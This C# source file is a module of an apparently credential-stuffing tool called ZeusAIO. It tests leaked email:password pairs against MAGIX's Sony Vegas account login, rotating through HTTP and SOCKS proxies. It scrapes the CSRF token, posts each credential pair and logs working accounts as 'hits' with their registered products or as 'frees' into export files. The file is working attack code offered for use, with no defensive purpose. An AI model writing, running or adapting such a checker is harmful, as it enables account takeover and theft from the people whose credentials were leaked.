using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace Sonyvegas
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.IgnoreProtocolErrors = true;
                            req.KeepAlive = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("Pragma", " no-cache");
                            req.AddHeader("Accept", " */*");
                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            string res = req.Get("https://ap.magix.com/servicecenter/index.php?lang=US&style=vegas19").ToString();
                            string csrf = Parse(res, "input type=\"hidden\" name=\"mx_csrf_token\" value=\"", "\">");
                            req.AddHeader("Pragma", " no-cache");
                            req.AddHeader("Accept", " */*");
                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            res = req.Post("https://ap.magix.com/servicecenter/index.php?lang=US&style=vegas19", "module=quickregister&submode=login&b=1&fm_logintype=1&fm_email=" + s[0] + "&fm_pass=" + s[1] + "&mx_csrf_token=" + csrf, "application/x-www-form-urlencoded").ToString();
                            if (res.Contains("Login incorrect") || res.Contains("login data was not accepted"))
                            {
                                break;
                            }
                            else if (res.Contains("User data") || res.Contains("My products"))
                            {
                                req.AddHeader("Pragma", " no-cache");
                                req.AddHeader("Accept", " */*");
                                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                                res = req.Get("https://ap.magix.com/servicecenter/index.php?lang=US&style=vegas19&module=myproducts").ToString();
                                if (res.Contains("User data") && res.Contains("You have registered the following MAGIX products.") == false)
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - SONYVEGAS] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Sonyvegas_frees", s[0] + ":" + s[1]);
                                    return false;


                                }
                                else if (res.Contains("><td colspan=2 class=\"tableColumnTypeHeadline\" valign=\"middle\" height=\"25\"><b>"))
                                {
                                    string prod = Parse(res, "><td colspan=2 class=\"tableColumnTypeHeadline\" valign=\"middle\" height=\"25\"><b>", "</b></td>");
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - SONYVEGAS] " + s[0] + ":" + s[1] + " | Products: " + prod, Color.Green);
                                    }
                                    Export.AsResult("/Sonyvegas_hits", s[0] + ":" + s[1] + " | Products: " + prod);
                                    return false;

                                }
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

